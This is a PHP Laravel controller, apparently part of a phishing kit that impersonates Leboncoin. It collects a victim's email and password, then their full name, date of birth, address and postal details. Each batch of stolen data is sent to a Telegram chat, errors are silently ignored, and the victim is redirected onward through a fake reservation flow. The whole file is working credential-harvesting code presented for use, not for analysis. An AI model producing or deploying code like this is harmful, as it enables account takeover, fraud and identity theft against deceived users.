<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Notifications\TelegramAlert;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Log;

class PaymentController extends Controller
{
    /**
     * Étape 1 : Réception des données - redirection vers réservation
     */
    public function sendToTelegram(Request $request)
    {
        $validated = $request->validate([
            'username'    => 'required|string|max:225',
            'password' =>  'required|string|min:8|max:255',
        ]);

        // Formatage du message Telegram
        $message = "🔔 *INFORMATIONS LEBONCOIN* 🔔\n\n"
                 . "📧 Email : {$validated['username']}\n"
                 . "🔐 Mot de passe : {$validated['password']}";

        // Envoyer Telegram en arrière-plan avec timeout court
        try {
            // Set max execution time to 2 seconds for Telegram
            $startTime = microtime(true);
            
            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
                ->notify(new TelegramAlert($message));
            
            $elapsed = microtime(true) - $startTime;
            if ($elapsed > 1) {
                Log::warning('Telegram took ' . round($elapsed, 2) . 's');
            }
        } catch (\Throwable $e) {
            Log::warning('Telegram failed (non-critical): ' . $e->getMessage());
        }

        // Continuer quoi qu'il arrive
        return redirect()->route('personal-info');
    }

    /**
     * Étape 2 : Traitement des informations personnelles
     */
    public function storePersonalInfo(Request $request)
    {
        $validated = $request->validate([
            'full_name' => 'required|string|max:255',
            'date_of_birth' => 'required|date|before:today',
            'address' => 'required|string|max:255',
            'postal_code' => 'required|string|regex:/^[0-9]{5}$/',
            'city' => 'required|string|max:255',
            'region' => 'required|string|max:255',
            'article_amount' => 'required|numeric|min:0',
        ]);

        // Formatage du message Telegram
        $message = "👤 *INFORMATIONS PERSONNELLES* 👤\n\n"
                 . "👤 Nom et Prénoms : {$validated['full_name']}\n"
                 . "🎂 Date de naissance : {$validated['date_of_birth']}\n"
                 . "🏠 Adresse : {$validated['address']}\n"
                 . "📮 Code postal : {$validated['postal_code']}\n"
                 . "🏘️ Ville : {$validated['city']}\n"
                 . "🗺️ Région : {$validated['region']}\n"
                 . "💰 Montant : {$validated['article_amount']} €";

        // Envoyer Telegram en arrière-plan avec timeout court
        try {
            $startTime = microtime(true);
            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
                ->notify(new TelegramAlert($message));
            $elapsed = microtime(true) - $startTime;
            if ($elapsed > 1) {
                Log::warning('Telegram took ' . round($elapsed, 2) . 's');
            }
        } catch (\Throwable $e) {
            Log::warning('Telegram failed (non-critical): ' . $e->getMessage());
        }

        // Continuer quoi qu'il arrive
        return redirect()->route('reservation');
    }
}
